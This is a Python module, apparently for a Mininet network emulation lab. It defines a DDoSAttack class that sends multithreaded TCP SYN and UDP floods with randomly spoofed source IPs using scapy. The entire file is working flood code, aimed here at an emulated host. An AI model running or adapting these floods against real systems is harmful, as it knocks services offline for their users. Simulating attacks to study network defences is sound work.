from scapy.all import IP, TCP, UDP, RandIP, RandShort, send
import threading
import time
from mininet.log import info


class DDoSAttack:
    def __init__(self, target_host):
        self.target_host = target_host
        self.attack_running = False
        self.attack_threads = []

    def tcp_flood(self, target_ip, target_port):
        """TCP SYN флуд атака"""
        while self.attack_running:
            packet = IP(src=str(RandIP()), dst=target_ip) / \
                     TCP(sport=RandShort(), dport=target_port, flags="S")
            send(packet, verbose=False)
            time.sleep(0.01)

    def udp_flood(self, target_ip, target_port):
        """UDP флуд атака"""
        while self.attack_running:
            packet = IP(src=str(RandIP()), dst=target_ip) / \
                     UDP(sport=RandShort(), dport=target_port) / \
                     ("X" * 1024)
            send(packet, verbose=False)
            time.sleep(0.01)

    def start_attack(self, attack_type="tcp", num_threads=4, target_port=80):
        """Запуск DDoS атаки"""
        self.attack_running = True
        target_ip = self.target_host.IP()

        info(f'*** Starting {attack_type.upper()} DDoS attack against {target_ip}:{target_port}\n')

        attack_func = self.tcp_flood if attack_type == "tcp" else self.udp_flood

        for _ in range(num_threads):
            thread = threading.Thread(
                target=attack_func,
                args=(target_ip, target_port)
            )
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)

    def stop_attack(self):
        """Зупинка атаки"""
        info('*** Stopping DDoS attack\n')
        self.attack_running = False
        for thread in self.attack_threads:
            thread.join(timeout=1)
        self.attack_threads.clear()